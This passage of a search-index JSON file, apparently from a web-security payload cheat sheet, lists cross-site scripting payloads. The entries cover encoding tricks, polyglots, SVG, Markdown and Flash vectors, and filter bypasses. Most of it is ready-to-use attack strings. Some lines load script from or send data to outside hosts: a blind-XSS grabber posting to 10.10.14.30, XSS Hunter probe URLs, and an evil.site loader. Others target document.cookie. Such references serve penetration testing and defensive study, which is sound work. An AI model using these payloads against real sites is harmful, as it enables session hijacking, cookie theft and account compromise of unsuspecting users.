hidden input","text":"<pre><code>&lt;input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\"&gt;\nUse CTRL+SHIFT+X to trigger the onclick event\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#xss-when-payload-is-reflected-capitalized","title":"XSS when payload is reflected capitalized","text":"<pre><code>&lt;IMG SRC=1 ONERROR=&amp;#X61;&amp;#X6C;&amp;#X65;&amp;#X72;&amp;#X74;(1)&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#dom-based-xss","title":"DOM based XSS","text":"<p>Based on a DOM XSS sink.</p> <pre><code>#\"&gt;&lt;img src=/ onerror=alert(2)&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#xss-in-js-context","title":"XSS in JS Context","text":"<pre><code>-(confirm)(document.domain)//\n; alert(1);//\n// (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#xss-in-wrappers-javascript-and-data-uri","title":"XSS in wrappers javascript and data URI","text":"<p>XSS with javascript:</p> <pre><code>javascript:prompt(1)\n\n%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341\n\n&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#99&amp;#111&amp;#110&amp;#102&amp;#105&amp;#114&amp;#109&amp;#40&amp;#49&amp;#41\n\nWe can encode the \"javascript:\" in Hex/Octal\n\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1)\n\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1)\n\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1)\n\nWe can use a 'newline character'\njava%0ascript:alert(1)   - LF (\\n)\njava%09script:alert(1)   - Horizontal tab (\\t)\njava%0dscript:alert(1)   - CR (\\r)\n\nUsing the escape character\n\\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\)\n\nUsing the newline and a comment //\njavascript://%0Aalert(1)\njavascript://anything%0D%0A%0D%0Awindow.alert(1)\n</code></pre> <p>XSS with data:</p> <pre><code>data:text/html,&lt;script&gt;alert(0)&lt;/script&gt;\ndata:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+\n&lt;script src=\"data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"&gt;&lt;/script&gt;\n</code></pre> <p>XSS with vbscript: only IE</p> <pre><code>vbscript:msgbox(\"XSS\")\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#xss-in-files","title":"XSS in files","text":"<p>** NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.</p> <pre><code>&lt;name&gt;\n  &lt;value&gt;&lt;![CDATA[&lt;script&gt;confirm(document.domain)&lt;/script&gt;]]&gt;&lt;/value&gt;\n&lt;/name&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#xss-in-xml","title":"XSS in XML","text":"<pre><code>&lt;html&gt;\n&lt;head&gt;&lt;/head&gt;\n&lt;body&gt;\n&lt;something:script xmlns:something=\"http://www.w3.org/1999/xhtml\"&gt;alert(1)&lt;/something:script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#xss-in-svg","title":"XSS in SVG","text":"<pre><code>&lt;?xml version=\"1.0\" standalone=\"no\"?&gt;\n&lt;!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"&gt;\n\n&lt;svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"&gt;\n  &lt;polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/&gt;\n  &lt;script type=\"text/javascript\"&gt;\n    alert(document.domain);\n  &lt;/script&gt;\n&lt;/svg&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#xss-in-svg-short","title":"XSS in SVG (short)","text":"<pre><code>&lt;svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/&gt;\n\n&lt;svg&gt;&lt;desc&gt;&lt;![CDATA[&lt;/desc&gt;&lt;script&gt;alert(1)&lt;/script&gt;]]&gt;&lt;/svg&gt;\n&lt;svg&gt;&lt;foreignObject&gt;&lt;![CDATA[&lt;/foreignObject&gt;&lt;script&gt;alert(2)&lt;/script&gt;]]&gt;&lt;/svg&gt;\n&lt;svg&gt;&lt;title&gt;&lt;![CDATA[&lt;/title&gt;&lt;script&gt;alert(3)&lt;/script&gt;]]&gt;&lt;/svg&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#xss-in-markdown","title":"XSS in Markdown","text":"<pre><code>[a](javascript:prompt(document.cookie))\n[a](j a v a s c r i p t:prompt(document.cookie))\n[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\n[a](javascript:window.onerror=alert;throw%201)\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#xss-in-swf-flash-application","title":"XSS in SWF flash application","text":"<pre><code>Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);\nIE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(\u2018?js=history.go(-1)\u2019,\u2019_self\u2019);}\nIE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(\u2018invalidfileinvalidfileinvalidfile\u2019,\u2019target\u2019);setTimeout(\u2018alert(w.document.location);w.close();\u2019,1);\n</code></pre> <p>more payloads in ./files</p>"},{"location":"web-application-attacks/cross-site-scripting/#xss-in-swf-flash-application_1","title":"XSS in SWF flash application","text":"<pre><code>flashmediaelement.swf?jsinitfunctio%gn=alert`1`\nflashmediaelement.swf?jsinitfunctio%25gn=alert(1)\nZeroClipboard.swf?id=\\\"))} catch(e) {alert(1);}//&amp;width=1000&amp;height=1000\nswfupload.swf?movieName=\"]);}catch(e){}if(!self.a)self.a=!alert(1);//\nswfupload.swf?buttonText=test&lt;a href=\"javascript:confirm(1)\"&gt;&lt;img src=\"https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg\"/&gt;&lt;/a&gt;&amp;.swf\nplupload.flash.swf?%#target%g=alert&amp;uid%g=XSS&amp;\nmoxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true\nvideo-js.swf?readyFunction=alert(1)\nplayer.swf?playerready=alert(document.cookie)\nplayer.swf?tracecall=alert(document.cookie)\nbanner.swf?clickTAG=javascript:alert(1);//\nio.swf?yid=\\\"));}catch(e){alert(1);}//\nvideo-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29\nbookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4\nflashcanvas.swf?id=test\\\"));}catch(e){alert(document.domain)}//\nphpmyadmin/js/canvg/flashcanvas.swf?id=test\\\u201d));}catch(e){alert(document.domain)}//\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#xss-in-css","title":"XSS in CSS","text":"<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;style&gt;\ndiv  {\n    background-image: url(\"data:image/jpg;base64,&lt;\\/style&gt;&lt;svg/onload=alert(document.domain)&gt;\");\n    background-color: #cccccc;\n}\n&lt;/style&gt;\n&lt;/head&gt;\n  &lt;body&gt;\n    &lt;div&gt;lol&lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#xss-in-postmessage","title":"XSS in PostMessage","text":"<p>If the target origin is asterisk * the message can be sent to any domain has reference to the child page.</p> <pre><code>&lt;html&gt;\n&lt;body&gt;\n    &lt;input type=button value=\"Click Me\" id=\"btn\"&gt;\n&lt;/body&gt;\n\n&lt;script&gt;\ndocument.getElementById('btn').onclick = function(e){\n    window.poc = window.open('http://www.redacted.com/#login');\n    setTimeout(function(){\n        window.poc.postMessage(\n            {\n                \"sender\": \"accounts\",\n                \"url\": \"javascript:confirm('XSS')\",\n            },\n            '*'\n        );\n    }, 2000);\n}\n&lt;/script&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#blind-xss","title":"Blind XSS","text":""},{"location":"web-application-attacks/cross-site-scripting/#xss-hunter","title":"XSS Hunter","text":"<p>XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.</p> <p>XSS Hunter is deprecated, it was available at https://xsshunter.com/app. </p> <p>You can set up an alternative version  * Self-hosted version from mandatoryprogrammer/xsshunter-express * Hosted on xsshunter.trufflesecurity.com</p> <pre><code>\"&gt;&lt;script src=\"https://js.rip/&lt;custom.name&gt;\"&gt;&lt;/script&gt;\n\"&gt;&lt;script src=//&lt;custom.subdomain&gt;.xss.ht&gt;&lt;/script&gt;\n&lt;script&gt;$.getScript(\"//&lt;custom.subdomain&gt;.xss.ht\")&lt;/script&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#other-blind-xss-tools","title":"Other Blind XSS tools","text":"<ul> <li>sleepy-puppy - Netflix</li> <li>bXSS - LewisArdern</li> <li>ezXSS - ssl</li> </ul>"},{"location":"web-application-attacks/cross-site-scripting/#blind-xss-endpoint","title":"Blind XSS endpoint","text":"<ul> <li>Contact forms</li> <li>Ticket support</li> <li>Referer Header</li> <li>Custom Site Analytics</li> <li>Administrative Panel logs</li> <li>User Agent</li> <li>Custom Site Analytics</li> <li>Administrative Panel logs</li> <li>Comment Box</li> <li>Administrative Panel</li> </ul>"},{"location":"web-application-attacks/cross-site-scripting/#tips","title":"Tips","text":"<p>You can use a Data grabber for XSS and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.</p> <p>Eg. payload</p> <pre><code>&lt;script&gt;document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain&lt;/script&gt;\n</code></pre> <p>Eg. one-line HTTP server:</p> <pre><code>$ ruby -run -ehttpd . -p8080\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#mutated-xss","title":"Mutated XSS","text":"<p>Use browsers quirks to recreate some HTML tags when it is inside an <code>element.innerHTML</code>.</p> <p>Mutated XSS from Masato Kinugawa, used against DOMPurify component on Google Search. Technical blogposts available at https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/ and https://research.securitum.com/dompurify-bypass-using-mxss/.</p> <pre><code>&lt;noscript&gt;&lt;p title=\"&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;\"&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#polyglot-xss","title":"Polyglot XSS","text":"<p>Polyglot XSS - 0xsobky</p> <pre><code>jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\\x3e\n</code></pre> <p>Polyglot XSS - Ashar Javed</p> <pre><code>\"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;\" &gt;&lt;/plaintext\\&gt;&lt;/|\\&gt;&lt;plaintext/onmouseover=prompt(1) &gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;\" &gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;&lt;img/id=\"confirm&amp;lpar; 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&amp;%23x29;&gt;'\"&gt;&lt;img src=\"http: //i.imgur.com/P8mL8.jpg\"&gt;\n</code></pre> <p>Polyglot XSS - Mathias Karlsson</p> <pre><code>\" onclick=alert(1)//&lt;button \u2018 onclick=alert(1)//&gt; */ alert(1)//\n</code></pre> <p>Polyglot XSS - Rsnake</p> <pre><code>';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//\";alert(String.fromCharCode (88,83,83))//\";alert(String.fromCharCode(88,83,83))//-- &gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83)) &lt;/SCRIPT&gt;\n</code></pre> <p>Polyglot XSS - Daniel Miessler</p> <pre><code>';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;\n\u201c onclick=alert(1)//&lt;button \u2018 onclick=alert(1)//&gt; */ alert(1)//\n'\"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;\"&gt;&lt;/plaintext\\&gt;&lt;/|\\&gt;&lt;plaintext/onmouseover=prompt(1)&gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;\"&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;&lt;img/id=\"confirm&amp;lpar;1)\"/alt=\"/\"src=\"/\"onerror=eval(id&amp;%23x29;&gt;'\"&gt;&lt;img src=\"http://i.imgur.com/P8mL8.jpg\"&gt;\njavascript://'/&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;--&gt;&lt;p\" onclick=alert()//&gt;*/alert()/*\njavascript://--&gt;&lt;/script&gt;&lt;/title&gt;&lt;/style&gt;\"/&lt;/textarea&gt;*/&lt;alert()/*' onclick=alert()//&gt;a\njavascript://&lt;/title&gt;\"/&lt;/script&gt;&lt;/style&gt;&lt;/textarea/--&gt;*/&lt;alert()/*' onclick=alert()//&gt;/\njavascript://&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;--&gt;&lt;/script&gt;&lt;a\"//' onclick=alert()//&gt;*/alert()/*\njavascript://'//\" --&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/script&gt;&lt;/title&gt;&lt;b onclick= alert()//&gt;*/alert()/*\njavascript://&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/script --&gt;&lt;li '//\" '*/alert()/*', onclick=alert()//\njavascript:alert()//--&gt;&lt;/script&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/title&gt;&lt;a\"//' onclick=alert()//&gt;*/alert()/*\n--&gt;&lt;/script&gt;&lt;/title&gt;&lt;/style&gt;\"/&lt;/textarea&gt;&lt;a' onclick=alert()//&gt;*/alert()/*\n/&lt;/title/'/&lt;/style/&lt;/script/&lt;/textarea/--&gt;&lt;p\" onclick=alert()//&gt;*/alert()/*\njavascript://--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;svg \"//' onclick=alert()//\n/&lt;/title/'/&lt;/style/&lt;/script/--&gt;&lt;p\" onclick=alert()//&gt;*/alert()/*\n</code></pre> <p>Polyglot XSS - @s0md3v </p> <pre><code>--&gt;'\"/&gt;&lt;/sCript&gt;&lt;svG x=\"&gt;\" onload=(co\\u006efirm)``&gt;\n</code></pre> <p></p> <pre><code>&lt;svg%0Ao%00nload=%09((pro\\u006dpt))()//\n</code></pre> <p>Polyglot XSS - from @filedescriptor's Polyglot Challenge</p> <pre><code># by crlf\njavascript:\"/*'/*`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;html \\\" onmouseover=/*&amp;lt;svg/*/onload=alert()//&gt;\n\n# by europa\njavascript:\"/*'/*`/*\\\" /*&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/noscript&gt;&lt;/noembed&gt;&lt;/template&gt;&lt;/script/--&gt;&amp;lt;svg/onload=/*&lt;html/*/onmouseover=alert()//&gt;\n\n# by EdOverflow\njavascript:\"/*\\\"/*`/*' /*&lt;/template&gt;&lt;/textarea&gt;&lt;/noembed&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/style&gt;&lt;/script&gt;--&gt;&amp;lt;svg onload=/*&lt;html/*/onmouseover=alert()//&gt;\n\n# by h1/ragnar\njavascript:`//\"//\\\"//&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/noscript&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;/template&gt;&amp;lt;svg/onload='/*--&gt;&lt;html */ onmouseover=alert()//'&gt;`\n</code></pre> <p>Polyglot XSS - from brutelogic <pre><code>JavaScript://%250Aalert?.(1)//'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*&lt;!--&gt;&lt;/Title/&lt;/Style/&lt;/Script/&lt;/textArea/&lt;/iFrame/&lt;/noScript&gt;\\74k&lt;K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//&gt;&lt;Base/Href=//X55.is\\76--&gt;\n</code></pre></p>"},{"location":"web-application-attacks/cross-site-scripting/#filter-bypass-and-exotic-payloads","title":"Filter Bypass and exotic payloads","text":""},{"location":"web-application-attacks/cross-site-scripting/#bypass-case-sensitive","title":"Bypass case sensitive","text":"<pre><code>&lt;sCrIpt&gt;alert(1)&lt;/ScRipt&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-tag-blacklist","title":"Bypass tag blacklist","text":"<pre><code>&lt;script x&gt;\n&lt;script x&gt;alert('XSS')&lt;script y&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-word-blacklist-with-code-evaluation","title":"Bypass word blacklist with code evaluation","text":"<pre><code>eval('ale'+'rt(0)');\nFunction(\"ale\"+\"rt(1)\")();\nnew Function`al\\ert\\`6\\``;\nsetTimeout('ale'+'rt(2)');\nsetInterval('ale'+'rt(10)');\nSet.constructor('ale'+'rt(13)')();\nSet.constructor`al\\x65rt\\x2814\\x29```;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-with-incomplete-html-tag","title":"Bypass with incomplete html tag","text":"<p>Works on IE/Firefox/Chrome/Safari</p> <pre><code>&lt;img src='1' onerror='alert(0)' &lt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-quotes-for-string","title":"Bypass quotes for string","text":"<pre><code>String.fromCharCode(88,83,83)\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-quotes-in-script-tag","title":"Bypass quotes in script tag","text":"<pre><code>http://localhost/bla.php?test=&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;\n&lt;html&gt;\n  &lt;script&gt;\n    &lt;?php echo 'foo=\"text '.$_GET['test'].'\";';`?&gt;\n  &lt;/script&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-quotes-in-mousedown-event","title":"Bypass quotes in mousedown event","text":"<p>You can bypass a single quote with ' in an on mousedown event handler</p> <pre><code>&lt;a href=\"\" onmousedown=\"var name = '&amp;#39;;alert(1)//'; alert('smthg')\"&gt;Link&lt;/a&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-dot-filter","title":"Bypass dot filter","text":"<pre><code>&lt;script&gt;window['alert'](document['domain'])&lt;/script&gt;\n</code></pre> <p>Convert IP address into decimal format: IE. <code>http://192.168.1.1</code> == <code>http://3232235777</code> http://www.geektools.com/cgi-bin/ipconv.cgi</p> <pre><code>&lt;script&gt;eval(atob(\"YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\"))&lt;script&gt;\n</code></pre> <p>Base64 encoding your XSS payload with Linux command: IE. <code>echo -n \"alert(document.cookie)\" | base64</code> == <code>YWxlcnQoZG9jdW1lbnQuY29va2llKQ==</code></p>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-parenthesis-for-string","title":"Bypass parenthesis for string","text":"<pre><code>alert`1`\nsetTimeout`alert\\u0028document.domain\\u0029`;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-parenthesis-and-semi-colon","title":"Bypass parenthesis and semi colon","text":"<pre><code>// From @garethheyes\n&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;\n&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;\n&lt;script&gt;throw onerror=alert,'some string',123,'haha'&lt;/script&gt;\n\n// From @terjanq\n&lt;script&gt;throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]&lt;/script&gt;\n\n// From @cgvwzq\n&lt;script&gt;TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']&lt;/script&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-onxxxx-blacklist","title":"Bypass onxxxx= blacklist","text":"<pre><code>&lt;object onafterscriptexecute=confirm(0)&gt;\n&lt;object onbeforescriptexecute=confirm(0)&gt;\n\n// Bypass onxxx= filter with a null byte/vertical tab\n&lt;img src='1' onerror\\x00=alert(0) /&gt;\n&lt;img src='1' onerror\\x0b=alert(0) /&gt;\n\n// Bypass onxxx= filter with a '/'\n&lt;img src='1' onerror/=alert(0) /&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-space-filter","title":"Bypass space filter","text":"<pre><code>// Bypass space filter with \"/\"\n&lt;img/src='1'/onerror=alert(0)&gt;\n\n// Bypass space filter with 0x0c/^L\n&lt;svg\fonload\f=\falert(1)\f&gt;\n\n$ echo \"&lt;svg^Lonload^L=^Lalert(1)^L&gt;\" | xxd\n00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  &lt;svg.onload.=.al\n00000010: 6572 7428 3129 0c3e 0a                   ert(1).&gt;.\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-email-filter","title":"Bypass email filter","text":"<p>(RFC compliant)</p> <pre><code>\"&gt;&lt;svg/onload=confirm(1)&gt;\"@x.y\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-document-blacklist","title":"Bypass document blacklist","text":"<pre><code>&lt;div id = \"x\"&gt;&lt;/div&gt;&lt;script&gt;alert(x.parentNode.parentNode.parentNode.location)&lt;/script&gt;\nwindow[\"doc\"+\"ument\"]\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-documentcookie-blacklist","title":"Bypass document.cookie blacklist","text":"<p>This is another way to access cookies on Chrome, Edge, and Opera. Replace COOKIE NAME with the cookie you are after. You may also investigate the getAll() method if that suits your requirements.</p> <pre><code>window.cookieStore.get('COOKIE NAME').then((cookieValue)=&gt;{alert(cookieValue.value);});\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-javascript-inside-a-string","title":"Bypass using javascript inside a string","text":"<pre><code>&lt;script&gt;\nfoo=\"text &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;\";\n&lt;/script&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-an-alternate-way-to-redirect","title":"Bypass using an alternate way to redirect","text":"<pre><code>location=\"http://google.com\"\ndocument.location = \"http://google.com\"\ndocument.location.href=\"http://google.com\"\nwindow.location.assign(\"http://google.com\")\nwindow['location']['href']=\"http://google.com\"\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-an-alternate-way-to-execute-an-alert","title":"Bypass using an alternate way to execute an alert","text":"<p>From @brutelogic tweet.</p> <pre><code>window['alert'](0)\nparent['alert'](1)\nself['alert'](2)\ntop['alert'](3)\nthis['alert'](4)\nframes['alert'](5)\ncontent['alert'](6)\n\n[7].map(alert)\n[8].find(alert)\n[9].every(alert)\n[10].filter(alert)\n[11].findIndex(alert)\n[12].forEach(alert);\n</code></pre> <p>From @theMiddle - Using global variables</p> <p>The Object.keys() method returns an array of a given object's own property names, in the same order as we get with a normal loop. That's means that we can access any JavaScript function by using its index number instead the function name.</p> <pre><code>c=0; for(i in self) { if(i == \"alert\") { console.log(c); } c++; }\n// 5\n</code></pre> <p>Then calling alert is :</p> <pre><code>Object.keys(self)[5]\n// \"alert\"\nself[Object.keys(self)[5]](\"1\") // alert(\"1\")\n</code></pre> <p>We can find \"alert\" with a regular expression like ^a[rel]+t$ :</p> <pre><code>a=()=&gt;{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} //bind function alert on new function a()\n\n// then you can use a() with Object.keys\n\nself[Object.keys(self)[a()]](\"1\") // alert(\"1\")\n</code></pre> <p>Oneliner: <pre><code>a=()=&gt;{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]](\"1\")\n</code></pre></p> <p>From @quanyang tweet.</p> <pre><code>prompt`${document.domain}`\ndocument.location='java\\tscript:alert(1)'\ndocument.location='java\\rscript:alert(1)'\ndocument.location='java\\tscript:alert(1)'\n</code></pre> <p>From @404death tweet.</p> <pre><code>eval('ale'+'rt(0)');\nFunction(\"ale\"+\"rt(1)\")();\nnew Function`al\\ert\\`6\\``;\n\nconstructor.constructor(\"aler\"+\"t(3)\")();\n[].filter.constructor('ale'+'rt(4)')();\n\ntop[\"al\"+\"ert\"](5);\ntop[8680439..toString(30)](7);\ntop[/al/.source+/ert/.source](8);\ntop['al\\x65rt'](9);\n\nopen('java'+'script:ale'+'rt(11)');\nlocation='javascript:ale'+'rt(12)';\n\nsetTimeout`alert\\u0028document.domain\\u0029`;\nsetTimeout('ale'+'rt(2)');\nsetInterval('ale'+'rt(10)');\nSet.constructor('ale'+'rt(13)')();\nSet.constructor`al\\x65rt\\x2814\\x29```;\n</code></pre> <p>Bypass using an alternate way to trigger an alert</p> <pre><code>var i = document.createElement(\"iframe\");\ni.onload = function(){\n  i.contentWindow.alert(1);\n}\ndocument.appendChild(i);\n\n// Bypassed security\nXSSObject.proxy = function (obj, name, report_function_name, exec_original) {\n      var proxy = obj[name];\n      obj[name] = function () {\n        if (exec_original) {\n          return proxy.apply(this, arguments);\n        }\n      };\n      XSSObject.lockdown(obj, name);\n  };\nXSSObject.proxy(window, 'alert', 'window.alert', false);\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-nothing","title":"Bypass \"&gt;\" using nothing","text":"<p>You don't need to close your tags.</p> <pre><code>&lt;svg onload=alert(1)//\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-and-using-and","title":"Bypass \"&lt;\" and \"&gt;\" using \uff1c and \uff1e","text":"<p>Unicode Character U+FF1C and U+FF1E</p> <pre><code>\uff1cscript/src=//evil.site/poc.js\uff1e\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-another-character","title":"Bypass \";\" using another character","text":"<pre><code>'te' * alert('*') * 'xt';\n'te' / alert('/') / 'xt';\n'te' % alert('%') % 'xt';\n'te' - alert('-') - 'xt';\n'te' + alert('+') + 'xt';\n'te' ^ alert('^') ^ 'xt';\n'te' &gt; alert('&gt;') &gt; 'xt';\n'te' &lt; alert('&lt;') &lt; 'xt';\n'te' == alert('==') == 'xt';\n'te' &amp; alert('&amp;') &amp; 'xt';\n'te' , alert(',') , 'xt';\n'te' | alert('|') | 'xt';\n'te' ? alert('ifelsesh') : 'xt';\n'te' in alert('in') in 'xt';\n'te' instanceof alert('instanceof') instanceof 'xt';\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-html-encoding","title":"Bypass using HTML encoding","text":"<pre><code>%26%2397;lert(1)\n&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;\n&gt;&lt;/script&gt;&lt;svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)&gt;\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-katakana","title":"Bypass using Katakana","text":"<p>Using the Katakana library.</p> <pre><code>javascript:([,\u30a6,,,,\u30a2]=[]+{},[\u30cd,\u30db,\u30cc,\u30bb,,\u30df,\u30cf,\u30d8,,,\u30ca]=[!!\u30a6]+!\u30a6+\u30a6.\u30a6)[\u30c4=\u30a2+\u30a6+\u30ca+\u30d8+\u30cd+\u30db+\u30cc+\u30a2+\u30cd+\u30a6+\u30db][\u30c4](\u30df+\u30cf+\u30bb+\u30db+\u30cd+'(-~\u30a6)')()\n</code></pre>"},{"location":"web-application-attacks/cross-site-scripting/#bypass-using-cuneiform","title":"Bypass using 